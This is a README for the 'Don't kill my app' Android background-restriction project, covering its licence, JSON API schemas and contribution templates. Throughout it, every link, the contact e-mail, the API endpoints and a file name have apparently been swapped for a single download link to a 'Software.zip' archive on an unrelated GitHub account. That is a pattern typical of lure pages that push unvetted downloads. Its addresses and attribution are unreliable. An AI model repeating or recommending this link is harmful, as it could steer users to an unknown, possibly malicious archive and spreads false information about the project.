# Android vendors, don't kill my app!

### [https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip](https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip)

## Licence

This project's source code is open but not intended to be copied in its entirety.
The content (compiled site), as it shows at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip, is licenced under CC-BY licence, and thus free to be shared, adapted, even commercially, under the condition of mentioning the original authors of the site, as either https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip, or Urbandroid Team. 

## API

The website provides a JSON API at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip for developers to use on their websites or in their apps.

If you use the API, please let us know via e-mail at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip and give credit to https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip

### API v1 docs

URL: https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip

API v1 outputs info on all vendors in one big JSON. If you want one JSON URL per vendor, see API v2.

scheme:
````
{ "vendors" :
  [
    {
      "name": "Human-readable vendor name",
      "manufacturer": ["name","alias1","alias2"],
      "url": "/relative-url-to-vendor",
      "award": number or null,
      "position": number or null,
      "explanation": "JSON-escaped HTML",
      "user_solution": "JSON-escaped HTML",
      "developer_solution": "JSON-escaped HTML"
    },
    {
      ...
    },
    {
      ...
    }
  ]
}
````

### API v2 docs

URL: https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip[vendor].json

example: [https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip](https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip)

API v2 provides one JSON URL per vendor.

scheme:
````
{
  "name": "Human-readable vendor name",
  "manufacturer": ["name","alias1","alias2"],
  "url": "/relative-url-to-vendor",
  "award": number or null,
  "position": number or null,
  "explanation": "JSON-escaped HTML",
  "user_solution": "JSON-escaped HTML",
  "developer_solution": "JSON-escaped HTML"
}
````

## Contribution

Pull requests are very welcome, as well as discussion using GitHub issues.

### Add a new vendor / edit existing vendor:

In _vendor folder, add or edit a https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip file.

Template:

```
---
name: Nokia
layout: vendor
permalink: nokia
explanation: '<html or markdown here>'
user_solution: '<html or markdown here>'
developer_solution: '<html or markdown here>'
---

Y U say stock Android!?
```

### Award a vendor
Add
```
award: (int between 1 and 5)
```
variable to the https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip file you wish to award.

## Who started this project?

Ultimately, every indie Android developer is at least partly affected by this issue.

We at Urbandroid Team are affected heavily with our Sleep as Android app and we gathered so much info about hacks and workarounds that we felt the need to share the info. We started by contacting individual indie developers with offers to exchange info, which led to the idea of a more effective approach in the form of a libre software website.
